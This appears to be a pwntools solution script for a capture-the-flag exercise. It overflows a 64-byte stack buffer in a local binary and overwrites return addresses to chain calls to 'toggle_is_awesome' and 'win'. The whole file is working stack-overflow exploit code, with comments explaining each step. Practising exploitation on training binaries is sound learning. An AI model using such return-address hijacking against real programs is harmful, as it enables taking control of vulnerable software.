import os; os.chdir("..")
from pwn import *

p = process('./challenge')

payload  = b'a' * 64 # Use up the buffer
payload += b'a' * 8  # Overwrite saved rbp with garbage

# First we need to call `toggle_is_awesome` and then we need to call `win`

# Overwrite the return address for `main`
payload += p64(p.elf.functions['toggle_is_awesome'].address)
# Overwrite the return address for the function that called `main`
payload += p64(p.elf.functions['win'].address)

p.sendline(payload)
print(p.recvall().split(b'\n')[2])
